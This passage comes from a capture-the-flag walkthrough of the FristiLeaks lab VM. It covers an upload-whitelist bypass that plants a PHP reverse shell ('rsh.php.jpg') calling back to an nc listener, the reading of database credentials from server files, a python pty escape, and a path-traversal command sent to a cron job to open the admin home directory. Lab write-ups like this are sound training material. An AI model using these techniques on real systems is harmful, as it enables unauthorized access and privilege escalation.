+</span><span class='line'><span class="nv">U5ErkJggg</span><span class="o">==</span>
+</span><span class='line'>root@kali:~/fristileaks# tr -d <span class="s1">&#39;\n&#39;</span> &lt; test.txt &gt; base64_decoded.txt
+</span><span class='line'>root@kali:~/fristileaks# cat base64_decoded.txt
+</span><span class='line'>iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARSSURBVHhe7dlRdtsgEIVhr8sL8nqymmwmi0klS0iAQGY0Nb01//dWSQyTgdxz2t5+AcCHHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL5kc+fm63yaP7/XP/5RUM2jx7iMz1ZdqpguZHPl+zJO53b9+1gd/0TL2Wull5+RMpJq5tMTkE1paHlVXJJZv7/d5i6qse0t9rWa6UMsR1+WrORl72DbdWKqZS0tMPqGl8LRhzyWjWkTFDPXFmulC7e81bxnNOvbDpYzOMN1WqplLS0w+oaXwomXXtfhL8e6W+lrNdDFujoQNJ9XbKtHMpSUmn9BSeGf51bUcr6W+VjNdjJQjcelwepPCjlLNXFpi8gktXfnVtYSd6UpINdPFCDlyKB3dyPLpSTVzZYnJR7R0WHEiFGv5NrDU12qmC/1/Zz2ZWXi1abli0aLqjZdq5sqSxUgtWY7syq+u6UpINdOFeI5ENygbTfj+qDbc+QpG9c5uvFQzV5aM15LlyMrfnrPU12qmC+Ucqd+g6E1JNsX16/i/6BtvvEQzF5YM2JLhyMLz4sNNtp/pSkg104VajmwziEdZvmSz9E0YbzbI/FSycgVSzZiXDNmS4cjCni+kLRnqizXThUqOhEkso2k5pGy00aLqi1n+skSqGfOSIVsKC5Zv4+XH36vQzbl0V0t9rWb6EMyRaLLp+Bbhy31k8SBbjqpUNSHVjHXJmC2FgtOH0drysrz404sdLPW1mulDLUdSpdEsk5vf5Gtqg1xnfX88tu/PZy7VjHXJmC21H9lWvBBfdZb6Ws30oZ0jk3y+pQ9fnEG4lNOco9UnY5dqxrhk0JZKezwdNwqfnv6AOUN9sWb6UMyR5zT2B+lwDh++Fl3K/U+z2uFJNWNcMmhLzUe2v6n/dAWG+mLN9KGWI9EcKsMJl6o6+ecH8dv0Uu4PnkqDl2rGuiS8HKul9iMrFG9gqa/VTB8qORLuSTqF7fYU7tgsn/4+zfhV6aiiIsczlGrGvGTIlsLLhiPbnh6KnLDU12qmD+0cKQ8nunpVcZ21Rj7erEz0WqoZ+5IRW1oXNB3Z/vBMWulSfYlm+hDLkcIAtuHEUzu/l9l867X34rPtA6lmLi0ZrqX6gu37aIukRkVaylRfqpk+9HNkH85hNocTKC4P31Vebhd8fy/VzOTCkqeBWlrrFheEPdMjO3SSys7XVF+qmT5UcmT9+Ss//fyyOLU3kWoGLd59ZKb6Us10IZMjAP5b5AgAL3IEgBc5AsCLHAHgRY4A8CJHAHiRIwC8yBEAXuQIAC9yBIAXOQLAixwB4EWOAPAiRwB4kSMAvMgRAF7kCAAvcgSAFzkCwIscAeBFjgDwIkcAeJEjALzIEQBe5AgAL3IEgBc5AsCLHAHgRY4A8Pn9/QNa7zik1qtycQAAAABJRU5ErkJggg<span class="o">==</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After decoded this, I got a PNG file:</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/3.png"></p>
+
+<p>In terms of all the information we collected from this page/source code, I can guess the username is <font color="red"><code>eezeepz</code></font> and the password is <font color="red"><code>keKkeKKeKKeKkEkkEk</code></font>.</p>
+
+<p>After login, I got a link to allow us upload file!</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/4.png"></p>
+
+<p>But when I trying to upload <code>.php</code> webshell, I got the following error, only <code>png</code>, <code>jpg</code> and <code>gif</code> are allowed.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/5.png"></p>
+
+<p>In order to bypass the whitelist verification, I added <code>.jpg</code> at the end of the web shell&rsquo;s file name to make it looks like <code>rsh.php.jpg</code>.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/6.png"></p>
+
+<p><code>rsh.php</code> is a reverse PHP shell which will connect back to my Kali&rsquo;s tcp port <code>5555</code>, so before I upload and trigger the shell, I setup <code>nc</code> to listen on port <code>5555</code>.</p>
+
+<p>Ok, after uploaded the reverse PHP shell, I can now visit it from uploads folder, the url is <code>http://10.1.1.150/fristi/uploads/rsh.php.jpg</code>.</p>
+
+<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/fristileaks/7.png"></p>
+
+<p>Bingo! I got a shell now.</p>
+
+<p>After enumeration I found Database sensitive information stored in the file <code>/var/www/html/fristi/checklogin.php</code>, user name <font color="red"><code>eezeepz</code></font> and the password is <font color="red"><code>4ll3maal12#</code></font></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">\</span><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">ob_start</span><span class="p">();</span>
+</span><span class='line'><span class="nv">$host</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="p">;</span> <span class="c1">// Host name</span>
+</span><span class='line'><span class="nv">$username</span><span class="o">=</span><span class="s2">&quot;eezeepz&quot;</span><span class="p">;</span> <span class="c1">// Mysql username</span>
+</span><span class='line'><span class="nv">$password</span><span class="o">=</span><span class="s2">&quot;4ll3maal12#&quot;</span><span class="p">;</span> <span class="c1">// Mysql password</span>
+</span><span class='line'><span class="nv">$db_name</span><span class="o">=</span><span class="s2">&quot;hackmenow&quot;</span><span class="p">;</span> <span class="c1">// Database name</span>
+</span><span class='line'><span class="nv">$tbl_name</span><span class="o">=</span><span class="s2">&quot;members&quot;</span><span class="p">;</span> <span class="c1">// Table name</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Connect to server and select databse.</span>
+</span><span class='line'><span class="nb">mysql_connect</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$host</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$username</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$password</span><span class="s2">&quot;</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;cannot connect&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nb">mysql_select_db</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$db_name</span><span class="s2">&quot;</span><span class="p">)</span><span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;cannot select DB&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="c1">// Define $myusername and $mypassword</span>
+</span><span class='line'><span class="nv">$myusername</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;myusername&#39;</span><span class="p">];</span>
+</span><span class='line'><span class="nv">$mypassword</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;mypassword&#39;</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">...</span> <span class="nx">turncate</span> <span class="o">...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The first thing I thought was to login via SSH with the found username and password, but SSH is not running on the target server.</p>
+
+<p>Then, I tried <code>su</code> command but it has too be called from a TTY session. by using the trick <font color="red"><code>python -c "import pty; pty.spawn('/bin/bash');"</code></font> to jail break, I can try <code>su</code> again with the login credential. But still failed, Damn, the password is wrong.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span>python -c <span class="s2">&quot;import pty; pty.spawn(&#39;/bin/bash&#39;);&quot;</span>
+</span><span class='line'>python -c <span class="s2">&quot;import pty; pty.spawn(&#39;/bin/bash&#39;);&quot;</span>
+</span><span class='line'>bash-4.1<span class="nv">$ </span>su eezeepz
+</span><span class='line'>su eezeepz
+</span><span class='line'>Password: 4ll3maal12#
+</span><span class='line'>
+</span><span class='line'>idsu: incorrect password
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So I have to keep digging further, then I found a clue file <code>notes.txt</code> under the path <code>/var/www/</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span><span class="nb">pwd</span>
+</span><span class='line'>/var/www
+</span><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>sh-4.1<span class="nv">$ </span>ls -al
+</span><span class='line'>ls -al
+</span><span class='line'>total 28
+</span><span class='line'>drwxr-xr-x.  <span class="m">6</span> root root <span class="m">4096</span> Nov <span class="m">17</span> 13:50 .
+</span><span class='line'>drwxr-xr-x. <span class="m">19</span> root root <span class="m">4096</span> Nov <span class="m">19</span> 01:41 ..
+</span><span class='line'>drwxr-xr-x.  <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">24</span> 13:53 cgi-bin
+</span><span class='line'>drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">17</span> 03:29 error
+</span><span class='line'>drwxr-xr-x.  <span class="m">7</span> root root <span class="m">4096</span> Nov <span class="m">25</span> 04:10 html
+</span><span class='line'>drwxr-xr-x.  <span class="m">3</span> root root <span class="m">4096</span> Nov <span class="m">17</span> 03:37 icons
+</span><span class='line'>-rw-r--r--   <span class="m">1</span> root root   <span class="m">98</span> Nov <span class="m">17</span> 13:50 notes.txt
+</span><span class='line'>sh-4.1<span class="nv">$ </span>cat notes.txt
+</span><span class='line'>cat notes.txt
+</span><span class='line'>hey eezeepz your homedir is a mess, go clean it up, just dont delete
+</span><span class='line'>the important stuff.
+</span><span class='line'>
+</span><span class='line'>-jerry
+</span><span class='line'>sh-4.1<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In that file, jerry mentioned home directory about user <code>eezeepz</code>. by following this clue, I checked <code>/home</code> directory:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'>sh-4.1$ cd /home
+</span><span class='line'>cd /home
+</span><span class='line'>sh-4.1$ ls -al
+</span><span class='line'>ls -al
+</span><span class='line'>total 28
+</span><span class='line'>drwxr-xr-x.  5 root      root       4096 Nov 19 01:40 .
+</span><span class='line'>dr-xr-xr-x. 22 root      root       4096 Dec 27 17:50 ..
+</span><span class='line'>drwx------.  2 admin     admin      4096 Nov 19 02:03 admin
+</span><span class='line'>drwx---r-x.  5 eezeepz   eezeepz   12288 Nov 18 15:35 eezeepz
+</span><span class='line'>drwx------   2 fristigod fristigod  4096 Nov 19 01:40 fristigod
+</span><span class='line'>sh-4.1$
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As we can see from above, home folder <code>eezeepz</code> has global read and execute permission for anyone.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span>ls -al
+</span><span class='line'>ls -al
+</span><span class='line'>total 2608
+</span><span class='line'>drwx---r-x. <span class="m">5</span> eezeepz eezeepz  <span class="m">12288</span> Nov <span class="m">18</span> 15:35 .
+</span><span class='line'>drwxr-xr-x. <span class="m">5</span> root    root      <span class="m">4096</span> Nov <span class="m">19</span> 01:40 ..
+</span><span class='line'>drwxrwxr-x. <span class="m">2</span> eezeepz eezeepz   <span class="m">4096</span> Nov <span class="m">17</span> 09:40 .Old
+</span><span class='line'>-rw-r--r--. <span class="m">1</span> eezeepz eezeepz     <span class="m">18</span> Sep <span class="m">22</span> 12:40 .bash_logout
+</span><span class='line'>-rw-r--r--. <span class="m">1</span> eezeepz eezeepz    <span class="m">176</span> Sep <span class="m">22</span> 12:40 .bash_profile
+</span><span class='line'>-rw-r--r--. <span class="m">1</span> eezeepz eezeepz    <span class="m">124</span> Sep <span class="m">22</span> 12:40 .bashrc
+</span><span class='line'>drwxrwxr-x. <span class="m">2</span> eezeepz eezeepz   <span class="m">4096</span> Nov <span class="m">17</span> 09:40 .gnome
+</span><span class='line'>drwxrwxr-x. <span class="m">2</span> eezeepz eezeepz   <span class="m">4096</span> Nov <span class="m">17</span> 09:40 .settings
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">24376</span> Nov <span class="m">17</span> 09:49 MAKEDEV
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">33559</span> Nov <span class="m">17</span> 09:49 cbq
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">6976</span> Nov <span class="m">17</span> 09:49 cciss_id
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">56720</span> Nov <span class="m">17</span> 09:49 cfdisk
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">25072</span> Nov <span class="m">17</span> 09:49 chcpu
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">52936</span> Nov <span class="m">17</span> 09:48 chgrp
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">31800</span> Nov <span class="m">17</span> 09:49 chkconfig
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">48712</span> Nov <span class="m">17</span> 09:48 chmod
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">53640</span> Nov <span class="m">17</span> 09:48 chown
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">44528</span> Nov <span class="m">17</span> 09:49 clock
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">4808</span> Nov <span class="m">17</span> 09:49 consoletype
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">129992</span> Nov <span class="m">17</span> 09:48 cpio
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">38608</span> Nov <span class="m">17</span> 09:49 cryptsetup
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">5344</span> Nov <span class="m">17</span> 09:49 ctrlaltdel
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">41704</span> Nov <span class="m">17</span> 09:48 cut
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">14832</span> Nov <span class="m">17</span> 09:49 halt
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13712</span> Nov <span class="m">17</span> 09:49 hostname
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">44528</span> Nov <span class="m">17</span> 09:49 hwclock
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">7920</span> Nov <span class="m">17</span> 09:49 kbd_mode
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11576</span> Nov <span class="m">17</span> 09:49 <span class="nb">kill</span>
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">16472</span> Nov <span class="m">17</span> 09:49 killall5
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">32928</span> Nov <span class="m">17</span> 09:49 kpartx
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11464</span> Nov <span class="m">17</span> 09:49 nameif
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">171784</span> Nov <span class="m">17</span> 09:49 nano
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">5512</span> Nov <span class="m">17</span> 09:49 netreport
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">123360</span> Nov <span class="m">17</span> 09:49 netstat
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13892</span> Nov <span class="m">17</span> 09:49 new-kernel-pkg
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">25208</span> Nov <span class="m">17</span> 09:49 nice
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13712</span> Nov <span class="m">17</span> 09:49 nisdomainname
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz   <span class="m">4736</span> Nov <span class="m">17</span> 09:49 nologin
+</span><span class='line'>-r--r--r--. <span class="m">1</span> eezeepz eezeepz    <span class="m">514</span> Nov <span class="m">18</span> 14:53 notes.txt
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">390616</span> Nov <span class="m">17</span> 09:49 tar
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11352</span> Nov <span class="m">17</span> 09:49 taskset
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">249000</span> Nov <span class="m">17</span> 09:49 tc
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">51536</span> Nov <span class="m">17</span> 09:49 telinit
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">47928</span> Nov <span class="m">17</span> 09:49 touch
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">11440</span> Nov <span class="m">17</span> 09:49 tracepath
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">12304</span> Nov <span class="m">17</span> 09:49 tracepath6
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">21112</span> Nov <span class="m">17</span> 09:49 <span class="nb">true</span>
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">35608</span> Nov <span class="m">17</span> 09:49 tune2fs
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">15410</span> Nov <span class="m">17</span> 09:49 weak-modules
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">12216</span> Nov <span class="m">17</span> 09:49 wipefs
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz <span class="m">504400</span> Nov <span class="m">17</span> 09:49 xfs_repair
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">13712</span> Nov <span class="m">17</span> 09:49 ypdomainname
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz     <span class="m">62</span> Nov <span class="m">17</span> 09:49 zcat
+</span><span class='line'>-rwxr-xr-x. <span class="m">1</span> eezeepz eezeepz  <span class="m">47520</span> Nov <span class="m">17</span> 09:47 zic
+</span><span class='line'>sh-4.1<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well, it is really mess. but we can notice that there is another <code>notes.txt</code> which should be more clues in it.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sh-4.1<span class="nv">$ </span>cat notes.txt
+</span><span class='line'>cat notes.txt
+</span><span class='line'>Yo EZ,
+</span><span class='line'>
+</span><span class='line'>I made it possible <span class="k">for</span> you to <span class="k">do</span> some automated checks,
+</span><span class='line'>but I did only allow you access to /usr/bin/* system binaries. I did
+</span><span class='line'>however copy a few extra often needed commands to my
+</span><span class='line'>homedir: chmod, df, cat, <span class="nb">echo</span>, ps, grep, egrep so you can use those
+</span><span class='line'>from /home/admin/
+</span><span class='line'>
+</span><span class='line'>Don<span class="err">&#39;</span>t forget to specify the full path <span class="k">for</span> each binary!
+</span><span class='line'>
+</span><span class='line'>Just put a file called <span class="s2">&quot;runthis&quot;</span> in /tmp/, each line one command. The
+</span><span class='line'>output goes to the file <span class="s2">&quot;cronresult&quot;</span> in /tmp/. It should
+</span><span class='line'>run every minute with my account privileges.
+</span><span class='line'>
+</span><span class='line'>- Jerry
+</span><span class='line'>sh-4.1<span class="nv">$ </span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Looks like I have to break out of jail from <code>runthis</code>. So I create the file <code>runthis</code> under <code>/tmp</code>, which only including one command <code>chmod 777 /home/admin</code> to change folder permission of <code>/home/admin</code>. However, after couple of seconds waiting, I got the error information: <code>command did not start with /home/admin or /usr/bin</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>cat /tmp/run   
+</span><span class='line'>cat /tmp/runthis
+</span><span class='line'>chmod <span class="m">777</span> /home/admin
+</span><span class='line'>bash-4.1<span class="nv">$ </span>cat /tmp/cron   
+</span><span class='line'>cat /tmp/cronresult
+</span><span class='line'><span class="nb">command </span>did not start with /home/admin or /usr/bin
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok ok&hellip; so the command have to start with <code>/home/admin</code> or <code>/usr/bin</code>, so I modified the <code>runthis</code> file to <code>/home/admin/../../bin/chmod -R 777 /home/admin</code>, and waiting seconds, the <code>/home/admin</code> has been set to full permission now!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ls -al /home
+</span><span class='line'>ls -al /home
+</span><span class='line'>total 28
+</span><span class='line'>drwxr-xr-x.  <span class="m">5</span> root      root       <span class="m">4096</span> Nov <span class="m">19</span> 01:40 .
+</span><span class='line'>dr-xr-xr-x. <span class="m">22</span> root      root       <span class="m">4096</span> Dec <span class="m">27</span> 17:50 ..
+</span><span class='line'>drwxrwxrwx.  <span class="m">2</span> admin     admin      <span class="m">4096</span> Nov <span class="m">19</span> 02:03 admin
+</span><span class='line'>drwx---r-x.  <span class="m">5</span> eezeepz   eezeepz   <span class="m">12288</span> Nov <span class="m">18</span> 15:35 eezeepz
+</span><span class='line'>drwx------   <span class="m">2</span> fristigod fristigod  <span class="m">4096</span> Nov <span class="m">19</span> 01:40 fristigod
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Get into <code>/home/admin</code> and enumeration, found three suspect files: <code>cryptedpass.txt</code>, <code>cryptpass.py</code> and <code>whoisyourgodnow.txt</code>.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">pwd</span>
+</span><span class='line'><span class="nb">pwd</span>
+</span><span class='line'>/home/admin
+</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -al
+</span><span class='line'>ls -al
+</span><span class='line'>total 652
+</span><span class='line'>drwxrwxrwx. <span class="m">2</span> admin     admin       <span class="m">4096</span> Nov <span class="m">19</span> 02:03 .
+</span><span class='line'>drwxr-xr-x. <span class="m">5</span> root      root        <span class="m">4096</span> Nov <span class="m">19</span> 01:40 ..
+</span><span class='line'>-rwxrwxrwx. <span class="m">1</span> admin     admin         <span class="m">18</span> Sep <span class="m">22</span> 12:40 .bash_logout
+</span><span class='line'>-rwxrwxrwx. <span class="m">1</span> admin     admin        <span class="m">176</span> Sep <span class="m">22</span> 12:40 .bash_profile
+</span><span class='line'>-rwxrwxrwx. <span class="m">1</span> admin     admin        <span class="m">124</span> Sep <span class="m">22</span> 12:40 .bashrc
+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">45224</span> Nov <span class="m">18</span> 13:42 cat
+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin      <span class="m">48712</span> Nov <span class="m">18</span> 14:14 chmod
+</span><span class='line'>-rwxrwxrwx  <span class="m">1</span> admin     admin        <span class="m">737</span> Nov <span class="m">18</span> 14:48 cronjob.py
